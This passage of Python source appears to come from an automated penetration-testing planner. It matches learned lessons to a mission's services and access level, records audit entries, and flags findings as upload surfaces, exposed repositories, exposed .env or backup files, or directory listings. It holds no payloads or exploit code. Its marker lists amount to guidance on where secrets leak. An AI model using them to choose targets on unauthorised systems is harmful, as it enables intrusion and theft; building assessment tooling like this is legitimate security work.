                why_matches.append(f"endpoint: {', '.join(sorted(playbook_paths & mission_paths)[:3])}")
            else:
                endpoint_match = False
                reasons.append("endpoint evidence mismatch")
                missing_evidence.append("confirm matching endpoint evidence")
        if required_access and required_access != "none":
            if _access_satisfies(current_access, required_access):
                access_match = True
                why_matches.append(f"access: {current_access}")
            else:
                access_match = False
                reasons.append("required access state missing")
                missing_evidence.append(f"requires {required_access} access")
        return {
            "reasons": reasons,
            "why_matches": why_matches,
            "missing_evidence": missing_evidence,
            "service_match": service_match,
            "endpoint_match": endpoint_match,
            "risk_match": risk_match,
            "access_match": access_match,
            "required_access": required_access,
            "current_access": current_access,
        }

    def _lesson_audit_entry(
        self,
        action: NextAction,
        decision: LessonMatchDecision,
        *,
        selected: bool,
    ) -> dict[str, Any]:
        status = decision.status
        effect = decision.effect
        reasons = list(decision.reasons)
        if decision.can_influence and not selected:
            status = "rejected"
            effect = "none"
            _append_unique(reasons, "outside top lesson influence limit")

        return _base_audit_entry(
            source_type="lesson",
            source_id=decision.lesson.id,
            status=status,
            action=action,
            reasons=reasons or [decision.lesson.reason()],
            why_matches=list(decision.why_matches),
            missing_evidence=list(decision.missing_evidence),
            service_match=decision.service_match,
            endpoint_match=decision.endpoint_match,
            risk_match=decision.risk_match,
            access_match=decision.access_match,
            required_access=decision.required_access,
            current_access=decision.current_access,
            scope_allowed=decision.scope_allowed,
            proposal_only=False,
            effect=effect,
            score=decision.score,
        )

    def _mark_action_audit_rejected(
        self,
        action: NextAction,
        reason: str,
        *,
        registry_available: bool | None = None,
    ) -> None:
        matched = False
        for entry in self._learning_audit:
            if entry.get("action_key") != action.key:
                continue
            matched = True
            entry["status"] = "rejected"
            entry["priority_delta"] = 0
            if registry_available is not None:
                entry["registry_available"] = registry_available
            _append_unique(entry.setdefault("reasons", []), reason)
        if not matched:
            self._learning_audit.append(_base_audit_entry(
                source_type="action",
                source_id=action.key,
                status="rejected",
                action=action,
                reasons=[reason],
                registry_available=registry_available,
                proposal_only=_action_is_proposal_only(action),
            ))

    def _set_action_audit_priority_delta(self, action: NextAction, delta: int) -> None:
        if not delta:
            return
        for entry in self._learning_audit:
            if entry.get("action_key") == action.key and entry.get("status") == "applied":
                entry["priority_delta"] = delta

    def _target_value(self, target: Target) -> str:
        return (target.value or "").strip()

    def _domain_from_target(self, value: str) -> str:
        parsed = urlparse(value if re.match(r"^[a-zA-Z]+://", value) else f"//{value}")
        domain = parsed.hostname or value
        return domain.strip().rstrip(".")

    def _is_web_service(self, svc: Service) -> bool:
        name = svc.service.lower()
        return name in {"http", "https", "http-proxy", "ssl", "https-alt"} or svc.port in {80, 443, 8000, 8080, 8443}

    def _service_url(self, svc: Service) -> str:
        scheme = "https" if svc.port in {443, 8443} or svc.service.lower() in {"https", "ssl", "https-alt"} else "http"
        default_port = 443 if scheme == "https" else 80
        suffix = "" if svc.port == default_port else f":{svc.port}"
        return f"{scheme}://{svc.host}{suffix}"

    def _service_query(self, svc: Service) -> str:
        parts = [svc.service, svc.version]
        query = " ".join(part.strip() for part in parts if part and part.strip())
        return query[:120]

    def _extract_cve(self, finding: Finding) -> str:
        match = re.search(r"CVE-\d{4}-\d{4,7}", f"{finding.title} {finding.evidence}", re.IGNORECASE)
        return match.group(0).upper() if match else ""

    def _finding_evidence(self, finding: Finding) -> list[str]:
        snippets: list[str] = []
        for item in finding.evidence_items[:3]:
            snippet = " ".join(str(getattr(item, "snippet", "") or "").split())
            if snippet:
                snippets.append(snippet[:180])
        if not snippets and finding.evidence:
            snippets.append(" ".join(finding.evidence.split())[:180])
        return snippets

    def _finding_metadata_value(self, finding: Finding, key: str) -> str:
        for item in finding.evidence_items:
            metadata = getattr(item, "metadata", {}) or {}
            value = metadata.get(key)
            if value:
                return str(value)
        return ""

    def _blocked_tool_names(self, mission: MissionContext) -> set[str]:
        blocked: set[str] = set()
        for finding in mission.findings:
            if finding.category != "tool_prerequisite_missing":
                continue
            missing_tool = self._finding_metadata_value(finding, "missing_tool")
            if not missing_tool:
                continue
            blocked.update(_MISSING_TOOL_BLOCKS.get(missing_tool, set()))
        return blocked

    def _suppressed_by_current_session_failure(self, action: NextAction, mission: MissionContext) -> bool:
        if action.method in _CORRECTIVE_METHODS:
            return False
        mission_id = str(getattr(mission, "id", "") or "")
        if not mission_id:
            return False
        for lesson in self.lessons:
            if lesson.is_success or str(lesson.session_name or "") != mission_id:
                continue
            if self._lesson_exactly_matches_action(lesson, action):
                return True
        return False

    def _lesson_exactly_matches_action(self, lesson: CaseLesson, action: NextAction) -> bool:
        action_tool = str(action.tool_name or "")
        action_method = str(action.method or "")
        tool_matches = bool(lesson.action_tool_name and lesson.action_tool_name == action_tool)
        method_matches = bool(lesson.action_method and lesson.action_method == action_method)
        if not tool_matches and not method_matches:
            return False

        lesson_args = {
            str(key): str(value)
            for key, value in (lesson.action_arguments or {}).items()
            if key in _ACTION_ARGUMENT_MATCH_KEYS and str(value).strip()
        }
        if not lesson_args:
            return True

        action_args = {
            str(key): str(value)
            for key, value in (action.arguments or {}).items()
            if key in _ACTION_ARGUMENT_MATCH_KEYS and str(value).strip()
        }
        return all(action_args.get(key) == value for key, value in lesson_args.items())

    def _finding_path_target(self, finding: Finding) -> str:
        for item in finding.evidence_items:
            metadata = getattr(item, "metadata", {}) or {}
            path = str(metadata.get("path") or "").strip()
            if path:
                base = finding.target.rstrip("/")
                if base.startswith(("http://", "https://")) and path.startswith("/"):
                    return f"{base}{path}"
                return path
        return finding.target or finding.title[:80]

    def _finding_base_url(self, finding: Finding) -> str:
        """Extract base URL (scheme://host[:port]) from a finding's target."""
        target = finding.target or ""
        if not target.startswith(("http://", "https://")):
            return ""
        parsed = urlparse(target)
        if not parsed.hostname:
            return ""
        port_suffix = f":{parsed.port}" if parsed.port and parsed.port not in {80, 443} else ""
        return f"{parsed.scheme}://{parsed.hostname}{port_suffix}"

    def _looks_like_upload_surface(self, finding: Finding) -> bool:
        haystack = f"{finding.title} {finding.target} {finding.evidence}".casefold()
        for item in finding.evidence_items:
            metadata = getattr(item, "metadata", {}) or {}
            haystack += f" {metadata.get('path', '')}".casefold()
        return any(marker in haystack for marker in ("upload", "uploads", "uploader", "panel"))

    def _looks_like_source_disclosure(self, finding: Finding) -> bool:
        haystack = self._finding_haystack(finding)
        return any(marker in haystack for marker in ("/.git", ".git/", "/.svn", "/.hg", "/.bzr"))

    def _looks_like_sensitive_file_exposure(self, finding: Finding) -> bool:
        haystack = self._finding_haystack(finding)
        markers = (
            "/.env",
            ".env",
            "backup",
            "config",
            ".bak",
            ".old",
            ".sql",
            ".zip",
            ".tar",
            ".gz",
            "debug",
            "phpinfo",
            "server-status",
        )
        return any(marker in haystack for marker in markers)

    def _looks_like_directory_listing(self, finding: Finding) -> bool:
        haystack = self._finding_haystack(finding)
        return any(marker in haystack for marker in ("directory listing", "directory indexing", "index of /"))

    def _finding_haystack(self, finding: Finding) -> str:
        haystack = f"{finding.title} {finding.target} {finding.evidence}".casefold()
        for item in finding.evidence_items:
            metadata = getattr(item, "metadata", {}) or {}
            haystack += f" {metadata.get('path', '')} {getattr(item, 'snippet', '')}".casefold()
        return haystack


def _service_families_from_values(values: Iterable[Any]) -> set[str]:
    text = " ".join(str(value or "").casefold() for value in values)
    if not text.strip():
        return set()

    markers = {
        "http": ("http", "apache", "nginx", "iis", "php", "tomcat", "jetty"),
        "ssh": ("ssh", "openssh"),
        "ftp": ("ftp", "vsftpd", "proftpd"),
        "smb": ("smb", "microsoft-ds", "samba", "netbios"),
        "database": ("mysql", "postgres", "postgresql", "mssql", "oracle", "mongodb"),
        "dns": ("dns", "bind", "domain"),
        "smtp": ("smtp", "mail", "postfix", "exim"),
        "ssl": ("ssl", "tls", "https"),
    }
    families: set[str] = set()
    for family, family_markers in markers.items():
        if any(marker in text for marker in family_markers):
            families.add(family)
    return families


def _service_families_from_services(mission: MissionContext) -> set[str]:
    values: list[Any] = []
    for svc in mission.services:
        values.extend([
            svc.host,
            svc.port,
            svc.protocol,
            svc.service,
            svc.version,
            svc.banner,
            *svc.vulns,
        ])
    for host in mission.hosts:
        values.extend([host.ip, host.hostname, host.os, host.role])
        for svc in host.services:
            values.extend([
                svc.host,
                svc.port,
                svc.protocol,
                svc.service,
                svc.version,
                svc.banner,
                *svc.vulns,
            ])
    return _service_families_from_values(values)


def _mission_endpoint_values(mission: MissionContext) -> list[str]:
    values: list[str] = []
    values.extend(target.value for target in mission.targets)
    values.extend(mission.scope.in_scope)
    for finding in mission.findings:
        values.extend([finding.title, finding.target, finding.evidence])
        for item in finding.evidence_items:
            metadata = getattr(item, "metadata", {}) or {}
            values.extend([
                str(getattr(item, "title", "") or ""),
                str(getattr(item, "target", "") or ""),
                str(getattr(item, "snippet", "") or ""),
            ])
            values.extend(str(value or "") for value in metadata.values())
    return values


def _path_hints(values: Iterable[Any]) -> set[str]:
    hints: set[str] = set()
    for value in values:
        raw = str(value or "")
        if not raw.strip():
            continue
        for match in re.finditer(
            r"(?:https?://[^\s\"'<>]+)|(?:/[A-Za-z0-9._~!$&'()*+,;=:@%-]+)",
            raw,
            flags=re.IGNORECASE,
        ):
            token = match.group(0).strip().rstrip(".,;")
            parsed = urlparse(token)
            path = parsed.path if parsed.scheme else token
            path = path.rstrip("/") or "/"
            if path != "/":
                hints.add(path.casefold())
    return hints


def _copy_audit_entry(entry: dict[str, Any]) -> dict[str, Any]:
    copied = dict(entry)
    for key in ("reasons", "why_matches", "missing_evidence"):
        copied[key] = list(copied.get(key, []) or [])
    return copied


def _base_audit_entry(
    *,
    source_type: str,
    source_id: str,
    status: str,
    action: NextAction | None,
    reasons: list[str] | None = None,
    why_matches: list[str] | None = None,
    missing_evidence: list[str] | None = None,
    service_match: bool | None = None,
    endpoint_match: bool | None = None,
    risk_match: bool | None = None,
    access_match: bool | None = None,
    required_access: str = "",
    current_access: str = "",
    scope_allowed: bool | None = None,
    registry_available: bool | None = None,
    proposal_only: bool = False,
    effect: str = "",
    score: float | None = None,
    priority_delta: int = 0,
) -> dict[str, Any]:
    return {
        "source_type": _audit_clip(source_type, 40),
        "source_id": _audit_clip(source_id, 120),
        "status": _audit_clip(status, 40),
        "effect": _audit_clip(effect, 80),
        "action_key": action.key if action is not None else "",
        "action_title": _audit_clip(getattr(action, "title", "") if action is not None else "", 180),
        "tool_name": _audit_clip(getattr(action, "tool_name", "") if action is not None else "", 80),
        "method": _audit_clip(getattr(action, "method", "") if action is not None else "", 120),
        "reasons": _audit_list(reasons or []),
        "why_matches": _audit_list(why_matches or []),
        "missing_evidence": _audit_list(missing_evidence or []),
        "service_match": service_match,
        "endpoint_match": endpoint_match,
        "risk_match": risk_match,
        "access_match": access_match,
        "required_access": _audit_clip(required_access, 40),
        "current_access": _audit_clip(current_access, 40),
        "scope_allowed": scope_allowed,
        "registry_available": registry_available,
        "proposal_only": bool(proposal_only),
        "score": score,
        "priority_delta": int(priority_delta or 0),
    }


def _audit_list(values: Iterable[Any]) -> list[str]:
    result: list[str] = []
    for value in values:
        clipped = _audit_clip(value, 180)
        if clipped:
            _append_unique(result, clipped)
    return result


def _audit_clip(value: Any, limit: int) -> str:
    return " ".join(str(value or "").split())[:limit]


def _append_unique(values: list[str], value: str) -> None:
    clean = _audit_clip(value, 180)
    if clean and clean not in values:
        values.append(clean)


def _action_is_proposal_only(action: NextAction) -> bool:
    if str(getattr(action, "phase", "") or "") == "proposal":
        return True
    for detail in getattr(action, "experience_details", []) or []:
        if isinstance(detail, dict) and detail.get("effect") == "playbook-proposal":
            return True
    return False
